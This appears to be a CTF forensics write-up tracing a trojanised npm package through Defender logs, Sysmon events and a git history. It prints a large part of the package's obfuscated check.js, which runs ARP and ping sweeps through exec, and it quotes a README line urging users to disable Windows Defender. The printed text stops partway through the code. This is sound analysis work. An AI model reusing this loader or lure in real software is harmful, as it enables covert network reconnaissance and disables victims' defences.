---
title: CPCTF2025
published: 2025-04-21
description: ''
image: ''
tags: [LogAnalysis, Networking, MalwareAnalysis, Reverse]
category: 'Log Analysis'
draft: false 
lang: 'en'
---

# CPCTF2025
## Challenge: Event Analyzer
>Category: Forensic
>Level: Medium-Hard
> There was a suspicious communication from the company's PC.
Apparently, a part-time employee in the company put his own package in and used it, but it seems that a malicious user mixed malware into it.
I would like you to analyze it and find out the following contents.
The files distributed by this issue contain programs that behave like malware. Use caution at runtime and use appropriate virtual environments, etc.
https://files.cpctf.space/EventAnalyze/forensics-new.zip
The username of the malicious user who introduced the malware
Malware's external destination IP
format: Converts to
e.g., when._192.0.2.0192_0_2_0
The malware's previously reported file name (excluding extensions) Example
: istest.pytest
Flag Format
CPCTF {username-IP-filename}-

### Artifact:
Following Description:
I have the file system for this challenge, which contains three very interesting folders related to the victim:
Documents
Logs (C:\Windows\System32\winevt\Logs)
Windows Defender
Tracking:
- In the Documents folder, there is a Git workspace under workspace/marktype. It appears to be a tool built using the Node.js framework
- For Windows Logs (.evtx files), I used EvtxECmd.exe and Timeline Explore from Eric Zimmerman's toolkit to analyze event logs efficently
- The Windows Defender folder has an interesting subdirectory named Support which contains many MP logs. These logs help track detected malicous files

### Windows Defenders to track malicious code 
Pathlocation: C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log
    MPDetection-*.log : Details about file detected
    MPlog-Scan*: Information about periodic scanning 
```
Select-String -Path "C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log" -Pattern "ThreatName"

```
Or you guys can check WindowsDefenderOperation.evtx
EventID:

| EventID  | Meaning               | 
| -------- | ----------------------| 
| 1116     | Threat Detected       |
| 1118     | Threat Quarantined    |
| 5007     | Configuaration change | *the signal disable Defender

I try to use EvtxCMD.exe and Timeline to hunt malicous script of Windefender log and the eventid 1116 gave me a notice that have a file python to be detected which Trojan

![image](https://hackmd.io/_uploads/rJb29cMkle.png)
fullpath : _C:\Users\User\Documents\workspaces\marktype\node_modules\@n37scancp\highlight.js\this_is_not_flag.py

"I immediately tracked the filesystem, but it seems the file was deleted by the user or attacker. I suspect the file might have been renamed or replaced. I checked the MPLog and found the hash of the file, then submitted it to VirusTotal for dynamic analysis. The result identified it as a trojan, with the file name evil.py
![image](https://hackmd.io/_uploads/ryu439f1ge.png)
![image](https://hackmd.io/_uploads/rJwS2cfyxe.png)
### Username's attacker
To get username for applying malicous code 
I was process and extract folder workspace go to marktype repo and read log
```
PS D:\workspaces\marktype> git show
fatal: detected dubious ownership in repository at 'D:/workspaces/marktype'
'D:/workspaces/marktype' is owned by:
        BUILTIN/Administrators (S-1-5-32-544)
but the current user is:
        DESKTOP-F1G30NU/tttho (S-1-5-21-468254640-2330663745-2608076463-1001)
To add an exception for this directory, call:

        git config --global --add safe.directory D:/workspaces/marktype
PS D:\workspaces\marktype> git config --global --add safe.directory D:/workspaces/marktype
PS D:\workspaces\marktype> git show
commit 0657d2ad695e9fb1418f76c8fea3170f79ce66c8 (HEAD -> main, origin/main, origin/HEAD)
Author: n37scan <n37scan@example.net>
Date:   Sat Apr 19 22:10:46 2025 +0900

    feat: update README

diff --git a/README.md b/README.md
index d259e56..bb312e8 100644
--- a/README.md
+++ b/README.md
@@ -2,6 +2,9 @@

 This is a simple markdown editor that allows you to write and preview markdown in real-time. It is built using React and Tailwind CSS.

+> [!NOTE]
+> Windows Defender may occasionally detect this as a false positive, but there is no problem. In such cases, please either turn off Windows Defender or add an exclusion setting.
+
 ## Features
 - Real-time preview of markdown
 - Syntax highlighting for code blocks
```
and then the username : n37scan


### Hunting C2 Attacker (for many ways )
"The last flag segment drove me mad for a long time, but thanks to it, I learned a lot from the process.

First, I checked the Sysmon logs and saw several signs of port scanning activity originating from the check.js file in the marktype tool repository.

For network analysis, I hunted through the logs using Event ID 3 (network connections from Sysmon).

However, it seemed like I had initially missed something very important: the internal user who downloaded the repository and executed the payload

By examining Windows Event Logs, I found Event ID 4720, which indicates a new user account creation, and Event ID 4722, which shows that a previously disabled account was enabled—likely granting privilege to execute the malicious payload."

```
{
    "EventData": {
        "Data": [
            {
                "@Name": "TargetUserName",
                "#text": "User"
            },
            {
                "@Name": "TargetDomainName",
                "#text": "WINDEV2407EVAL"
            },
            {
                "@Name": "TargetSid",
                "#text": "S-1-5-21-3321994293-4085765757-686894724-1000"
            },
            {
                "@Name": "SubjectUserSid",
                "#text": "S-1-5-18"
            },
            {
                "@Name": "SubjectUserName",
                "#text": "WINDEV2407EVAL$"
            },
            {
                "@Name": "SubjectDomainName",
                "#text": "WORKGROUP"
            },
            {
                "@Name": "SubjectLogonId",
                "#text": "0x3E7"
            },
            {
                "@Name": "PrivilegeList",
                "#text": "-"
            },
            {
                "@Name": "SamAccountName",
                "#text": "User"
            },
            {
                "@Name": "DisplayName",
                "#text": "%%1793"
            },
            {
                "@Name": "UserPrincipalName",
                "#text": "-"
            },
            {
                "@Name": "HomeDirectory",
                "#text": "%%1793"
            },
            {
                "@Name": "HomePath",
                "#text": "%%1793"
            },
            {
                "@Name": "ScriptPath",
                "#text": "%%1793"
            },
            {
                "@Name": "ProfilePath",
                "#text": "%%1793"
            },
            {
                "@Name": "UserWorkstations",
                "#text": "%%1793"
            },
            {
                "@Name": "PasswordLastSet",
                "#text": "%%1794"
            },
            {
                "@Name": "AccountExpires",
                "#text": "%%1794"
            },
            {
                "@Name": "PrimaryGroupId",
                "#text": "513"
            },
            {
                "@Name": "AllowedToDelegateTo",
                "#text": "-"
            },
            {
                "@Name": "OldUacValue",
                "#text": "0x0"
            },
            {
                "@Name": "NewUacValue",
                "#text": "0x15"
            },
            {
                "@Name": "UserAccountControl",
                "#text": ", %%2080, %%2082, %%2084"
            },
            {
                "@Name": "UserParameters",
                "#text": "%%1793"
            },
            {
                "@Name": "SidHistory",
                "#text": "-"
            },
            {
                "@Name": "LogonHours",
                "#text": "%%1797"
            }
        ]
    }
}
// Privc admin
{
    "EventData": {
        "Data": [
            {
                "@Name": "TargetUserName",
                "#text": "User"
            },
            {
                "@Name": "TargetDomainName",
                "#text": "WINDEV2407EVAL"
            },
            {
                "@Name": "TargetSid",
                "#text": "S-1-5-21-3321994293-4085765757-686894724-1000"
            },
            {
                "@Name": "SubjectUserSid",
                "#text": "S-1-5-18"
            },
            {
                "@Name": "SubjectUserName",
                "#text": "WINDEV2407EVAL$"
            },
            {
                "@Name": "SubjectDomainName",
                "#text": "WORKGROUP"
            },
            {
                "@Name": "SubjectLogonId",
                "#text": "0x3E7"
            }
        ]
    }
}
```

WINDEV2407EVAL/User : attacker
and then I analysis with user of attakcer
At EventID:3 sysmon for network connection
```
EventID 3 -> Map Description : Network Connection -> Executable Info: C:\Users\User\AppData\Local\Volta\tools\image\node\22.14.0\node.exe
EventID 1 -> Map Description : Process creation -> Execution : C:\Windows\system32\cmd.exe 
```
or you can track with EventID : 600 windows powershell operation log
```
Evenid: 600 -> Map Description : Provider is Started -> Executable Info:
```
for the first payload in arpscan and under it was scan ICMP 
```
Payload: {"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2025-04-17 15:52:26.591"},{"@Name":"ProcessGuid","#text":"45aec52c-23ba-6801-9407-000000000a00"},{"@Name":"ProcessId","#text":"14796"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"FileVersion","#text":"10.0.22621.3672 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows Command Processor"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"Cmd.Exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\cmd.exe /d /s /c \"arp -a\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\User\\Documents\\workspaces\\marktype\\node_modules\\@n37scancp\\highlight.js\\"},{"@Name":"User","#text":"WINDEV2407EVAL\\User"},{"@Name":"LogonGuid","#text":"45aec52c-efc3-6800-650f-0b0000000000"},{"@Name":"LogonId","#text":"0xB0F65"},{"@Name":"TerminalSessionId","#text":"1"},{"@Name":"IntegrityLevel","#text":"Medium"},{"@Name":"Hashes","#text":"SHA256=3F6AA206177BEBB29FC534C587A246E0F395941640F3F266C80743AF95A02150"},{"@Name":"ParentProcessGuid","#text":"45aec52c-2346-6801-7802-000000000a00"},{"@Name":"ParentProcessId","#text":"10132"},{"@Name":"ParentImage","#text":"C:\\Users\\User\\AppData\\Local\\Volta\\tools\\image\\node\\22.14.0\\node.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Users\\User\\AppData\\Local\\Volta\\tools\\image\\node\\22.14.0\\node.exe C:\\Users\\User\\Documents\\workspaces\\marktype\\node_modules\\@n37scancp\\highlight.js\\lib\\check.js childScan"},{"@Name":"ParentUser","#text":"WINDEV2407EVAL\\User"}]}}  (Count: 1)
```
The json code descript : process called from C:\\Users\\User\\AppData\\Local\\Volta\\tools\\image\\node\\22.14.0\\node.exe C:\\Users\\User\\Documents\\workspaces\\marktype\\node_modules\\@n37scancp\\highlight.js\\lib\\check.js childScan

reverse file check.js to understand tatics of attacker or you can track after scan arp the attacker used ping for many port from victim and open http to domainhostname : a96-7-128-209.deploy.static.akamaitechnologies.com
and destip : 96.7.128.209

but I chosen the way two which reverse file check.js because it call processID : ping.exe and arp scan
```
const uDOdzcLVrnBW$zxS = WoV$tBFijDNUIz;
(function(VtGSGO$egzKqhbdzX, UkXTniOk) {
    const pqzco_KFvLt = WoV$tBFijDNUIz
        , oOByfoMkNlbqnFB = VtGSGO$egzKqhbdzX();
    while (!![]) {
        try {
            const vIyHl = -parseFloat(pqzco_KFvLt(0x209)) / (-parseInt(0x1) * -0x1d9 + parseInt(0xffa) + -parseInt(0x11d2)) * (parseFloat(pqzco_KFvLt(0x20c)) / (Number(parseInt(0x23)) * parseInt(0x11) + Math.trunc(-parseInt(0x37d)) * -0x3 + parseInt(-0xcc8))) + parseInt(-parseFloat(pqzco_KFvLt(0x228)) / (parseInt(0x2) * -0x377 + -0x1357 * -parseInt(0x1) + Number(-parseInt(0x633)) * parseInt(0x2))) + parseFloat(-parseFloat(pqzco_KFvLt(0x1f8)) / (-parseInt(0x17cc) + parseFloat(parseInt(0x19a)) + parseInt(0x1636))) * parseInt(parseFloat(pqzco_KFvLt(0x23e)) / (parseInt(0x1c1) + Math.ceil(0xbad) + Math.floor(0x1) * Math.ceil(-0xd69))) + Math['floor'](parseFloat(pqzco_KFvLt(0x1fe)) / (parseInt(0x1b94) + Math.floor(0x3) * -0x95f + parseInt(0x8f))) * (-parseFloat(pqzco_KFvLt(0x21c)) / (Math.ceil(parseInt(0x5)) * parseInt(-parseInt(0x434)) + parseFloat(parseInt(0x1573)) + -0x68)) + -parseFloat(pqzco_KFvLt(0x235)) / (Math.floor(-parseInt(0x26ad)) + Math.ceil(-parseInt(0x7db)) + Math.max(-0xa, -parseInt(0xa)) * -0x4a8) + -parseFloat(pqzco_KFvLt(0x215)) / (0xf * -parseInt(0x1) + -parseInt(0x17c5) + parseInt(parseInt(0x29)) * 0x95) * (-parseFloat(pqzco_KFvLt(0x240)) / (parseFloat(-0x1ae8) + parseInt(0xe52) + Math.trunc(0xca0))) + Number(parseFloat(pqzco_KFvLt(0x20a)) / (0x1c7f * -0x1 + Math.max(parseInt(0x169), parseInt(0x169)) + Math.floor(parseInt(0x1b21)))) * Math['floor'](parseFloat(pqzco_KFvLt(0x22d)) / (-parseInt(0x87) * -0x18 + Math.floor(parseInt(0x1)) * -parseInt(0x2f8) + 0x1 * Number(-parseInt(0x9a4))));
            if (vIyHl === UkXTniOk) break;
            else oOByfoMkNlbqnFB['push'](oOByfoMkNlbqnFB['shift']());
        } catch (a$PYsRhhF) {
            oOByfoMkNlbqnFB['push'](oOByfoMkNlbqnFB['shift']());
        }
    }
}(FCFysguDoCPBlt$j_rW, -parseInt(0x2) * parseInt(0xab223) + -parseInt(0x1) * parseFloat(0x164afd) + Math.ceil(0x3867c4)));

function FCFysguDoCPBlt$j_rW() {
    const kE$QV$Zlc = ['878c898b80b79d8a87', '8a8b8c9194', '89819797858381', '8d838a8b9681', '8d8a9081968a8588', '928588918197', 'dcd5a6bc969e9189', '94888590828b9689', '96819488858781', 'c4c4a9a5a7dec4', '07665d076649076747076757014b5a0c554507676907676707676c07674b07675807664bdec4', '898d8a', '898590878c', 'd5d3d18797b7a08888', '9794888d90', 'd5d4ca', '858888', '8c90909497decbcb89818385ca8a9ecb828d8881cbb7a08bd48da7a6b5c7d58daebd9db7a69cd1abbedd8a9d919ea1bc888ddd91afaeb6809295bdacc98a9195ae82d08680be968f8b', '85968392', '908ba88b938196a7859781', '9790968d8a838d829d', 'b48d8a83c4908bc4', '948d8a83c4c987c4d5c4c9b3c4d5c4', 'd5d6d3cad4cad4cad5', '819c8187b485908c', 'd0dcd7d4d0d4d6b38b91a39c83', '888b83', '88818a83908c', '859494888d8785908d8b8acb8e978b8a', '9787858ac4858a80c497818a808196', 'd5d6a1b088a38081', '0d6465005b45026c74016e7bc8c407665d07676207675807665b07665d07665707675807676dde', '859694c4c985', 'a5b6b407665d0766490767470767570766760d726f01436f07657307655a07657dcacaca', '0d6465005b4507664c07674d076758de', '968180918781', '07665d076649076747076757005c49dec4', '938d8ad7d6', 'ddd6dddddcd4dca194b4b187ac', '93968d9081a28d8881b79d8a87', '948d8a83c4c98ac4d5c4c993c4d5d4d4d4c4', 'c482858d888180dec4', 'adb4dec4', '8a8190938b968fad8a9081968285878197', '908c818a', 'adb492d0', 'd5ddd6cad5d2dcca', 'd6d6d6d1d18b89b5b58a86', '878c8d8880b787858a', 'd5d6ddd2d3d4bca9a2b2b7b0', '8c909094decbcbddd2cad3cad5d6dccad6d4ddcb85948dcb818a80948b8d8a90', 'b4abb7b0', '8285898d889d', '888b8580a59090968d8691908197', '908d908881', '8196968b96', '979085909197', '918a968182', '898587', '898183858e97', '93968d9081', 'ee07674907675807664f07674fadb4dec4', 'd5d4d7d2b4abaebeac94', '07677f07665d07676ce9', '9790808b9190', '85808096819797', '07677f07665d07676c', '82968b89b1b6a8', 'd6d7d4d4d0d2aa938ba08a8e', '8e8b8d8a', '94968b87819797', '9491978c', 'ee07665d076649076747076757014a68005e62dec4', '878590878c', '8081869183', '878c8d8880bb94968b87819797', '828b96a185878c', '8a858981', '979085969097b38d908c', 'd5d0d7b395b6a0bcad', 'd2d3d4ddd1d4d5d3b6a99db6b79c', '02407801635e07657307657b07677f07665d07676cde', 'd2ddd3d0a0969481a7a6', '808b938a888b8580a69182828196', '819c8d90'];
    FCFysguDoCPBlt$j_rW = function() {
        return kE$QV$Zlc;
    };
    return FCFysguDoCPBlt$j_rW();
}
const {
    File
} = require(uDOdzcLVrnBW$zxS(0x1f5)), fs = require('fs'), {
    spawn
    , exec
} = require(uDOdzcLVrnBW$zxS(0x205)), os = require('os'), process = require(uDOdzcLVrnBW$zxS(0x200));

function getLocalIpAndNetwork() {
    const vIMfkPFyeCaSdQa = uDOdzcLVrnBW$zxS
        , HnoiYBg_zpfyjlM = os[vIMfkPFyeCaSdQa(0x23a)]();
    let uoYfpfJusgUKYSglT = vIMfkPFyeCaSdQa(0x226);
    for (const ScmEyaNqSlPWllfIdmzJzaOV of Object[vIMfkPFyeCaSdQa(0x214)](HnoiYBg_zpfyjlM)) {
        for (const FHpmigJLnQERONkokBNlv of ScmEyaNqSlPWllfIdmzJzaOV) {
            if (FHpmigJLnQERONkokBNlv[vIMfkPFyeCaSdQa(0x243)] === vIMfkPFyeCaSdQa(0x23c) && !FHpmigJLnQERONkokBNlv[vIMfkPFyeCaSdQa(0x213)]) {
                uoYfpfJusgUKYSglT = FHpmigJLnQERONkokBNlv[vIMfkPFyeCaSdQa(0x1fb)];
                break;
            }
        }
        if (uoYfpfJusgUKYSglT !== vIMfkPFyeCaSdQa(0x226)) break;
    }
    let rBKaogMXrBkpyTlcpKaV = Number(parseInt(0x19a)) * -0x17 + -0x1 * parseInt(0xc4f) + 0x17 * parseInt(0x223);
    if (uoYfpfJusgUKYSglT[vIMfkPFyeCaSdQa(0x208)](vIMfkPFyeCaSdQa(0x23d))) rBKaogMXrBkpyTlcpKaV = -parseInt(0x25b5) + -parseInt(0x22a6) + -0x4873 * parseInt(-0x1);
    else uoYfpfJusgUKYSglT[vIMfkPFyeCaSdQa(0x208)](vIMfkPFyeCaSdQa(0x21e)) ? rBKaogMXrBkpyTlcpKaV = -0x2 * Math.trunc(0x161) + Math.max(parseInt(0x2696), 0x2696) + Number(-parseInt(0x23c4)) : rBKaogMXrBkpyTlcpKaV = parseFloat(-0x148b) + Math.max(0x681, 0x681) + Number(0xe22);
    const A_i$fyG = uoYfpfJusgUKYSglT + '/' + rBKaogMXrBkpyTlcpKaV;
    return {
        'localIp': uoYfpfJusgUKYSglT
        , 'network': A_i$fyG
    };
}

function ipToNumber(RZYFhVngWcbUaYJSAPKE) {
    const lFcU_PzHHdMVTBUB = uDOdzcLVrnBW$zxS;
    return RZYFhVngWcbUaYJSAPKE[lFcU_PzHHdMVTBUB(0x21d)]('.')[lFcU_PzHHdMVTBUB(0x232)]((Fze_SYybip_oMfdmHOJrTLJpvr, pIFogwGMITZvRXUnlOrRA) => (Fze_SYybip_oMfdmHOJrTLJpvr << Math.floor(-0x930) + Number(0xeeb) * -0x2 + 0x270e) + parseInt(pIFogwGMITZvRXUnlOrRA, parseFloat(0x1) * -0x178d + Math.ceil(parseInt(0x16f)) * 0x14 + 0x515 * -0x1), -0x6d7 * -0x1 + Number(0x20dc) + -0x1 * Math.ceil(0x27b3));
}

function numberToIp(SV$qQrANuPlnejwaGXRTBATVl) {
    const KwwB_JOOg = uDOdzcLVrnBW$zxS;
    return [SV$qQrANuPlnejwaGXRTBATVl >>> -parseInt(0xd8d) * 0x2 + -parseInt(0x14b) + 0x1c7d & parseInt(0x2330) + parseInt(0x1587) + parseInt(0x2) * -parseInt(0x1bdc), SV$qQrANuPlnejwaGXRTBATVl >>> 0x1 * parseInt(-parseInt(0xdfd)) + -parseInt(0x23f7) + -parseInt(0x246) * -0x16 & -0x18cb * Math.max(parseInt(0x1), parseInt(0x1)) + 0x211d + Math.trunc(0xf) * -0x7d, SV$qQrANuPlnejwaGXRTBATVl >>> Math.ceil(-parseInt(0x1)) * 0x337 + parseFloat(parseInt(0x1358)) + -0x13d * 0xd & 0x3c8 + -0x1c59 + Math.trunc(parseInt(0x1990)), SV$qQrANuPlnejwaGXRTBATVl & -parseInt(0x651) + 0x2242 + parseInt(0x1af2) * -0x1][KwwB_JOOg(0x1ff)]('.');
}

function getIpRange(OKOCTzojtA_QdwLjmsYvY) {
    const WwQqArharkPHCec$h_v = uDOdzcLVrnBW$zxS
        , [Lshaa$GSebLSrsCEm, AxnBehrJmeDCxzERo$_Bwlq] = OKOCTzojtA_QdwLjmsYvY[WwQqArharkPHCec$h_v(0x21d)]('/')
        , skLPPJGkuROU$$bDdNePvOzqI = parseInt(AxnBehrJmeDCxzERo$_Bwlq, -parseInt(0x2538) + -0x380 + Number(-parseInt(0xd96)) * Math.floor(-0x3))
        , juyWkYFJzrPtGJVobyZ = ipToNumber(Lshaa$GSebLSrsCEm)
        , GRlaFNf$DsGBhcxGi$Vha = ~((-0x14b7 * Math.floor(-parseInt(0x1)) + -parseInt(0xa8a) * -0x3 + 0x44 * -parseInt(0xc5) << Math.ceil(0x2684) + 0x651 + -parseInt(0x221) * parseInt(0x15) - skLPPJGkuROU$$bDdNePvOzqI) - (Math.floor(-0x7a0) + parseInt(0x1) * Math.trunc(-parseInt(0x1cd)) + parseInt(0x96e))) >>> parseInt(0x3) * parseInt(0x92d) + 0x85 + -0x1c0c
        , kS_MQZSbH = juyWkYFJzrPtGJVobyZ & GRlaFNf$DsGBhcxGi$Vha
        , KBrSWaO$zebouAwh = kS_MQZSbH | ~GRlaFNf$DsGBhcxGi$Vha >>> Math.trunc(parseInt(0x21e)) * Math.trunc(-0x4) + -0x974 + Number(0x11ec)
        , ISAyCDJjyUPGRYNZrAHrlJj$vg = [];
    for (let m$yAhR_QRKShl = kS_MQZSbH + (Math.floor(parseInt(0x1c07)) + Math.floor(-0x227a) + Math.max(0x674, 0x674)); m$yAhR_QRKShl < KBrSWaO$zebouAwh; m$yAhR_QRKShl++) {
        ISAyCDJjyUPGRYNZrAHrlJj$vg[WwQqArharkPHCec$h_v(0x201)](numberToIp(m$yAhR_QRKShl));
    }
    return ISAyCDJjyUPGRYNZrAHrlJj$vg;
}

function WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX) {
    const t_zkek_TJFQ = FCFysguDoCPBlt$j_rW();
    return WoV$tBFijDNUIz = function(WUdwGkzbEVBepUzvjiwbh, NlmzZnWkXOvaQF$$Y) {
        WUdwGkzbEVBepUzvjiwbh = WUdwGkzbEVBepUzvjiwbh - (0x1 * Math.floor(0xec1) + 0x1 * parseInt(parseInt(0x7e1)) + Math.trunc(-0x14b0));
        let DBqcUC_bGhwXNTn$jWHczQ = t_zkek_TJFQ[WUdwGkzbEVBepUzvjiwbh];
        if (WoV$tBFijDNUIz['Qluqqr'] === undefined) {
            const LlTSrs__UZEexQjyvC = function(uydCEioFPKSAHCrsEM) {
                let xutO_S_dxEdfdSdk = -0x25 * parseInt(-parseInt(0x1d)) + 0x16b9 + -parseInt(0x1a06) & Math.ceil(-0x1128) + parseInt(0x6) * parseInt(0x562) + -parseInt(0xe25)
                    , s$GvwrdW = new Uint8Array(uydCEioFPKSAHCrsEM['match'](/.{1,2}/g)['map'](rjxrzgQ => parseInt(rjxrzgQ, parseFloat(0x31) * 0x43 + -parseInt(0x19) * parseInt(0xd) + Number(parseInt(0xb7e)) * parseInt(-0x1))))
                    , vzb_$nN = s$GvwrdW['map'](Monq$_AtE => Monq$_AtE ^ xutO_S_dxEdfdSdk)
                    , PIELHsxTQxjtFL = new TextDecoder()
                    , S_HSGp$ObSwKZaV = PIELHsxTQxjtFL['decode'](vzb_$nN);
                return S_HSGp$ObSwKZaV;
            };
            WoV$tBFijDNUIz['BYhUJP'] = LlTSrs__UZEexQjyvC, dL$XnoyZBnknlhIiCmEzwmu = arguments, WoV$tBFijDNUIz['Qluqqr'] = !![];
        }
        const qJIkgkxMUzlBjHd$PwhC = t_zkek_TJFQ[-parseInt(0x2) * Number(-0xdf3) + 0xeb2 + -0xbc * 0x3a]
            , mdif$q$Gv = WUdwGkzbEVBepUzvjiwbh + qJIkgkxMUzlBjHd$PwhC
            , dhW$ZTbNgbxwvUdYrNwNVOaHe = dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv];
        return !dhW$ZTbNgbxwvUdYrNwNVOaHe ? (WoV$tBFijDNUIz['rzVaPm'] === undefined && (WoV$tBFijDNUIz['rzVaPm'] = !![]), DBqcUC_bGhwXNTn$jWHczQ = WoV$tBFijDNUIz['BYhUJP'](DBqcUC_bGhwXNTn$jWHczQ), dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv] = DBqcUC_bGhwXNTn$jWHczQ) : DBqcUC_bGhwXNTn$jWHczQ = dhW$ZTbNgbxwvUdYrNwNVOaHe, DBqcUC_bGhwXNTn$jWHczQ;
    }, WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX);
}

function pingHost(QIjVxZBvsYDMpENrMJgTQtg) {
    return new Promise(pbLenJAfvOOjOiN => {
        const Yhg$esdViak$fLVHlNIWNli = WoV$tBFijDNUIz
            , kqJIEFSTYZ_$M = process[Yhg$esdViak$fLVHlNIWNli(0x216)];
        let DhFbLOiURXUC = '';
        kqJIEFSTYZ_$M === Yhg$esdViak$fLVHlNIWNli(0x234) ? DhFbLOiURXUC = Yhg$esdViak$fLVHlNIWNli(0x237) + QIjVxZBvsYDMpENrMJgTQtg : DhFbLOiURXUC = Yhg$esdViak$fLVHlNIWNli(0x225) + QIjVxZBvsYDMpENrMJgTQtg, exec(DhFbLOiURXUC, (MkQAHaYWgVUHH_NGZEeCkxW, eQ$uZASy, zxgXB_TP) => {
            const oA_OXLSsGVrxnGExLNuOpkCttf = Yhg$esdViak$fLVHlNIWNli;
            MkQAHaYWgVUHH_NGZEeCkxW && console[oA_OXLSsGVrxnGExLNuOpkCttf(0x204)](oA_OXLSsGVrxnGExLNuOpkCttf(0x224) + QIjVxZBvsYDMpENrMJgTQtg + oA_OXLSsGVrxnGExLNuOpkCttf(0x238) + MkQAHaYWgVUHH_NGZEeCkxW[oA_OXLSsGVrxnGExLNuOpkCttf(0x211)]), pbLenJAfvOOjOiN();
        });
    });
}

function getArpTable() {
    return new Promise((XqUfh, qOYGNEwMgsKGPdorxPTp$yQWDN) => {
        const bmrgjbJyEQ_RQ = WoV$tBFijDNUIz;
        exec(bmrgjbJyEQ_RQ(0x22f), (B$lqvkXpTANFvXjz$Wti, Sw_PoEHhWkd, G_qiqOCvzsMP_KHig) => {
            if (B$lqvkXpTANFvXjz$Wti) return qOYGNEwMgsKGPdorxPTp$yQWDN(B$lqvkXpTANFvXjz$Wti);
            const URQASHbgFrXwvfpDb_lq$WVq = parseArpOutput(Sw_PoEHhWkd);
            XqUfh(URQASHbgFrXwvfpDb_lq$WVq);
        });
    });
}

function parseArpOutput(kEy$vcx_WtNQYXcxo) {
    const AuTKBH$Tmfi = uDOdzcLVrnBW$zxS
        , Y$GNV$vwzbMLyVUFhVXTk = kEy$vcx_WtNQYXcxo[AuTKBH$Tmfi(0x21d)]('\x0a')
        , hCxsJ_spDQFlHfIR$iTyFgJd = [];
    for (const vFOhm_pkR_HitHvB of Y$GNV$vwzbMLyVUFhVXTk) {
        let jSgypQR$lX = null;
        if (process[AuTKBH$Tmfi(0x216)] === AuTKBH$Tmfi(0x234)) {
            jSgypQR$lX = vFOhm_pkR_HitHvB[AuTKBH$Tmfi(0x21b)](/(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F-]+)/);
            if (jSgypQR$lX) {
                const gNlVljxrqH$$SmfBir = jSgypQR$lX[-0x226c + 0x226e + -parseInt(0x1)]
                    , LeqP$H_EpszHzME = jSgypQR$lX[Math.max(0x4, parseInt(0x4)) * Math.trunc(-parseInt(0x114)) + 0x18 * Math.floor(0xf7) + Number(-0x12d6)][AuTKBH$Tmfi(0x217)](/-/g, ':')[AuTKBH$Tmfi(0x222)]();
                hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x201)]({
                    'ip': gNlVljxrqH$$SmfBir
                    , 'mac': LeqP$H_EpszHzME
                });
            }
        } else {
            jSgypQR$lX = vFOhm_pkR_HitHvB[AuTKBH$Tmfi(0x21b)](/\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-fA-F:]+)/);
            if (jSgypQR$lX) {
                const dXJQS = jSgypQR$lX[parseInt(0x836) + Math.max(parseInt(0x5), 0x5) * parseInt(0x362) + Math.max(0x3b, parseInt(0x3b)) * -parseInt(0x6d)]
                    , ZXOKPdIR = jSgypQR$lX[-0x25a4 + parseFloat(0x202f) + 0x577][AuTKBH$Tmfi(0x222)]();
                hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x201)]({
                    'ip': dXJQS
                    , 'mac': ZXOKPdIR
                });
            }
        }
    }
    return hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x22a)] > -0x1d97 + -parseInt(0x3) * -0x805 + parseInt(0x588) && (console[AuTKBH$Tmfi(0x229)](AuTKBH$Tmfi(0x20b)), hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x206)](B$$GHWjM => {
        const jGKWOyjbpksQvbdrwMiHY = AuTKBH$Tmfi;
        console[jGKWOyjbpksQvbdrwMiHY(0x229)](jGKWOyjbpksQvbdrwMiHY(0x239) + B$$GHWjM['ip'] + jGKWOyjbpksQvbdrwMiHY(0x218) + B$$GHWjM[jGKWOyjbpksQvbdrwMiHY(0x1f4)]);
    })), hCxsJ_spDQFlHfIR$iTyFgJd;
}
async function arpScan(PRNOXxYGxMUBjDcLuauGxiICX) {
    const GaREO$HGHSQf = uDOdzcLVrnBW$zxS;
    console[GaREO$HGHSQf(0x229)](GaREO$HGHSQf(0x230));
    let UJErS$yNxzFl = 0x1 * Number(0x2e9) + Math.floor(0x41a) + -parseInt(0x1) * parseInt(0x703);
    const Z$Smftd = PRNOXxYGxMUBjDcLuauGxiICX[GaREO$HGHSQf(0x22a)]
        , DGTmLzroPxjYfnTIVJ_x = 0x2 * parseInt(0x12dd) + -parseInt(0x9cb) + Math.ceil(parseInt(0x3)) * -parseInt(0x949);
    async function FNqybBmO(EzQbHadWKZ) {
        const RJjacHnh$bAvGggjAShOu$g = GaREO$HGHSQf
            , G_hKvvRcCRe = [];
        for (let TzOaTDA$_HMYICKRAjWThvdeNZ = EzQbHadWKZ; TzOaTDA$_HMYICKRAjWThvdeNZ < Math[RJjacHnh$bAvGggjAShOu$g(0x21a)](EzQbHadWKZ + DGTmLzroPxjYfnTIVJ_x, Z$Smftd); TzOaTDA$_HMYICKRAjWThvdeNZ++) {
            G_hKvvRcCRe[RJjacHnh$bAvGggjAShOu$g(0x201)](pingHost(PRNOXxYGxMUBjDcLuauGxiICX[TzOaTDA$_HMYICKRAjWThvdeNZ])[RJjacHnh$bAvGggjAShOu$g(0x23b)](() => {
                const DKZQnDFzNRLnB = RJjacHnh$bAvGggjAShOu$g;
                UJErS$yNxzFl++, process[DKZQnDFzNRLnB(0x1fa)][DKZQnDFzNRLnB(0x1f6)](DKZQnDFzNRLnB(0x233) + UJErS$yNxzFl + '/' + Z$Smftd + DKZQnDFzNRLnB(0x1f9));
            }));
        }
